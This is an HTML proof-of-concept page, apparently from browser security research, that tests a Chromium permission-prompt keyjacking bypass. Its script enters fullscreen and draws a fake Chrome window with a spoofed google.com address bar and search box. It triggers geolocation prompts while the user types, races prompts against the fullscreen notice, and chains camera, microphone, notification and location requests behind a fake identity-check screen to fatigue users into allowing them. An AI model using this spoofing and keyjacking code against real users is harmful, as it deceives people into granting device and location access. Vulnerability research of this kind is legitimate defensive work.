<!DOCTYPE html>
<html>
<head>
<title>PoC 2: Fullscreen + Permission Keyjacking</title>
<!--
  VH-2026-002: Fullscreen + Permission Prompt Keyjacking

  Target: Chromium 146+ (Desktop)

  Technique: Chromium's anti-keyjacking defense on permission dialogs
  uses a ~500ms activation delay. This PoC attempts to bypass it by:

  1. Enter fullscreen and render a fake browser UI with an input field
  2. Encourage the user to type (e.g., fake search box, chat input)
  3. While user is actively typing, trigger a permission prompt
  4. Test if the user's ongoing typing/keypresses can interact with
     the permission dialog before the activation delay expires

  Sub-techniques:
  A) Rapid Enter key during typing -> keyjack the Accept button
  B) Tab key during typing -> focus the Accept button, then Enter
  C) Space bar during typing -> activate focused Accept button

  Chromium defense: InputEventActivationProtector with 500ms delay.
  But this may not account for:
  - Keys already held down when the dialog appears
  - Keyboard repeat events from held keys
  - Platform-specific keyboard behavior (macOS key repeat)
-->
</head>
<body style="font-family: -apple-system, sans-serif; margin: 0; padding: 40px; background: #f0f0f0;">

<h2>Fullscreen + Permission Keyjacking</h2>
<p>Tests whether ongoing keyboard input can interact with permission prompts during the activation delay.</p>

<div style="display: flex; gap: 12px; flex-wrap: wrap; margin: 20px 0;">
  <button onclick="testEnterKeyjack()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #dc3545; color: #fff; border: none; border-radius: 8px;">
    A: Enter Key Keyjack
  </button>
  <button onclick="testTabKeyjack()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #fd7e14; color: #fff; border: none; border-radius: 8px;">
    B: Tab+Enter Keyjack
  </button>
  <button onclick="testFullscreenNotification()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #007bff; color: #fff; border: none; border-radius: 8px;">
    C: Fullscreen Notification Dismiss Race
  </button>
  <button onclick="testFullscreenMultiDialog()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #6f42c1; color: #fff; border: none; border-radius: 8px;">
    D: Multi-Dialog Confusion
  </button>
</div>

<div id="log" style="margin-top: 20px; padding: 16px; background: #1a1a1a; color: #0f0; font-family: monospace; font-size: 13px; border-radius: 8px; max-height: 300px; overflow-y: auto;"></div>

<script>
function log(msg) {
  const el = document.getElementById('log');
  if (el) el.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
}

// Enter fullscreen and render a fake browser with a text input
async function enterFakeChrome(callback) {
  try {
    await document.documentElement.requestFullscreen();
  } catch(e) {
    log('Fullscreen failed: ' + e.message);
    return;
  }

  // Replace body with fake Chrome UI
  document.body.style.margin = '0';
  document.body.style.padding = '0';
  document.body.style.background = '#fff';
  document.body.innerHTML = `
    <!-- Fake Chrome toolbar -->
    <div style="background: #dee1e6; padding: 4px 8px; display: flex; align-items: center; gap: 6px; height: 36px;">
      <div style="display: flex; gap: 4px; align-items: center;">
        <div style="width: 12px; height: 12px; border-radius: 50%; background: #ff5f57;"></div>
        <div style="width: 12px; height: 12px; border-radius: 50%; background: #febc2e;"></div>
        <div style="width: 12px; height: 12px; border-radius: 50%; background: #28c840;"></div>
      </div>
      <div style="flex: 1;"></div>
    </div>

    <!-- Fake tab bar -->
    <div style="background: #dee1e6; padding: 0 8px; display: flex; align-items: end; height: 32px;">
      <div style="background: #fff; padding: 6px 16px; border-radius: 8px 8px 0 0; font-size: 12px; color: #5f6368; display: flex; align-items: center; gap: 6px;">
        <img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' width='16' height='16'><rect fill='%234285f4' width='16' height='16' rx='2'/><text x='8' y='12' text-anchor='middle' fill='white' font-size='10'>G</text></svg>" width="16" height="16">
        Google
      </div>
    </div>

    <!-- Fake address bar -->
    <div style="background: #fff; padding: 8px 12px; border-bottom: 1px solid #e0e0e0; display: flex; align-items: center;">
      <div style="flex: 1; background: #f1f3f4; border-radius: 20px; padding: 8px 16px; display: flex; align-items: center; gap: 8px;">
        <svg width="16" height="16" fill="#5f6368" viewBox="0 0 24 24">
          <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
        </svg>
        <span style="font-size: 14px; color: #202124;">google.com</span>
      </div>
    </div>

    <!-- Fake Google search page with input -->
    <div style="text-align: center; padding: 80px 20px;">
      <div style="font-size: 92px; margin-bottom: 30px;">
        <span style="color: #4285f4;">G</span><span style="color: #ea4335;">o</span><span style="color: #fbbc05;">o</span><span style="color: #4285f4;">g</span><span style="color: #34a853;">l</span><span style="color: #ea4335;">e</span>
      </div>
      <div style="max-width: 580px; margin: 0 auto;">
        <input id="fakeSearch" type="text" autofocus
               placeholder="Search Google or type a URL"
               style="width: 100%; padding: 14px 20px; font-size: 16px; border: 1px solid #dfe1e5; border-radius: 24px; outline: none; box-sizing: border-box;"
               onkeydown="handleKey(event)">
        <div style="margin-top: 20px; display: flex; gap: 12px; justify-content: center;">
          <button style="padding: 10px 16px; background: #f8f9fa; border: 1px solid #f8f9fa; border-radius: 4px; font-size: 14px; color: #3c4043; cursor: pointer;">Google Search</button>
          <button style="padding: 10px 16px; background: #f8f9fa; border: 1px solid #f8f9fa; border-radius: 4px; font-size: 14px; color: #3c4043; cursor: pointer;">I'm Feeling Lucky</button>
        </div>
      </div>
    </div>
  `;

  // Focus the fake search input
  setTimeout(() => {
    const input = document.getElementById('fakeSearch');
    if (input) input.focus();
    if (callback) callback();
  }, 100);
}

let keyCount = 0;
let permissionTriggered = false;

function handleKey(e) {
  keyCount++;
  // After user has typed several characters, trigger permission
  if (keyCount >= 5 && !permissionTriggered) {
    permissionTriggered = true;
    triggerPermission();
  }
}

function triggerPermission() {
  // Trigger geolocation permission after the user is actively typing
  // The hypothesis: user's ongoing keypresses may hit the dialog
  navigator.geolocation.getCurrentPosition(
    () => { /* granted */ },
    () => { /* denied */ }
  );
}

// Variant A: Enter key keyjacking
function testEnterKeyjack() {
  log('[A] Entering fullscreen with fake Chrome UI...');
  log('[A] Type something in the search box, then rapidly hit Enter');
  log('[A] After 5 keystrokes, a permission prompt will appear');
  log('[A] CHECK: Does the Enter key interact with the permission prompt?');

  keyCount = 0;
  permissionTriggered = false;
  enterFakeChrome();
}

// Variant B: Tab keyjacking
function testTabKeyjack() {
  log('[B] Similar to A, but tests Tab key focus behavior');
  log('[B] Type in the search box, permission prompt appears');
  log('[B] CHECK: Does Tab key move focus to the permission dialog?');

  keyCount = 0;
  permissionTriggered = false;
  enterFakeChrome();
}

// Variant C: Race the fullscreen notification dismiss
// When entering fullscreen, Chrome shows "Press Esc to exit full screen"
// If we trigger a permission prompt WHILE the notification is visible,
// the Esc key press intended to exit fullscreen might interact with the prompt
function testFullscreenNotification() {
  log('[C] Testing fullscreen notification + permission race...');
  log('[C] Enter fullscreen -> immediately trigger permission');
  log('[C] The "Press Esc to exit" notification competes with the permission bubble');

  document.documentElement.requestFullscreen().then(() => {
    // Immediately trigger permission prompt
    // This races with the fullscreen notification
    setTimeout(() => {
      log('[C] Triggering permission during fullscreen notification...');
      navigator.geolocation.getCurrentPosition(
        () => log('[C] Geolocation GRANTED'),
        () => log('[C] Geolocation denied')
      );
    }, 50); // Very small delay - notification should still be visible

    // Also trigger notification permission
    setTimeout(() => {
      Notification.requestPermission().then(p => {
        log('[C] Notification permission: ' + p);
      });
    }, 100);

    log('[C] CHECK: Are both the fullscreen notification and permission prompt visible?');
    log('[C] CHECK: Does the fullscreen notification overlay the permission prompt?');
    log('[C] CHECK: Is the permission prompt origin visible?');
  }).catch(e => log('[C] Error: ' + e.message));
}

// Variant D: Multiple dialogs to create confusion
// Rapidly trigger multiple permission prompts and JS dialogs
// to overwhelm the user and cause them to click through
function testFullscreenMultiDialog() {
  log('[D] Testing multi-dialog confusion in fullscreen...');

  document.documentElement.requestFullscreen().then(() => {
    // Render fake Chrome UI
    document.body.style.margin = '0';
    document.body.innerHTML = `
      <div style="background: #fff; height: 100vh; display: flex; align-items: center; justify-content: center;">
        <div style="text-align: center;">
          <h1 style="color: #202124;">Loading secure content...</h1>
          <div style="width: 40px; height: 40px; border: 3px solid #1a73e8; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto;"></div>
          <p style="color: #5f6368;">Please wait while we verify your identity</p>
        </div>
      </div>
      <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
    `;

    // Chain of permission requests with varying delays
    // Goal: user gets fatigued and clicks "Allow" on one
    const delays = [500, 1200, 2000, 3500];
    const permissions = [
      () => navigator.geolocation.getCurrentPosition(() => log('[D] Geo GRANTED'), () => {}),
      () => Notification.requestPermission().then(p => log('[D] Notif: ' + p)),
      () => navigator.mediaDevices.getUserMedia({video: true}).then(() => log('[D] Camera GRANTED')).catch(() => {}),
      () => navigator.mediaDevices.getUserMedia({audio: true}).then(() => log('[D] Mic GRANTED')).catch(() => {}),
    ];

    delays.forEach((delay, i) => {
      setTimeout(() => {
        if (i < permissions.length) {
          log('[D] Triggering permission ' + (i + 1) + '...');
          permissions[i]();
        }
      }, delay);
    });

    log('[D] Multiple permission prompts will appear in sequence');
    log('[D] CHECK: How does Chrome handle rapid permission requests in fullscreen?');
    log('[D] CHECK: Is the origin visible for each prompt?');
    log('[D] CHECK: Can the user easily distinguish and respond to each?');

  }).catch(e => log('[D] Error: ' + e.message));
}
</script>
</body>
</html>
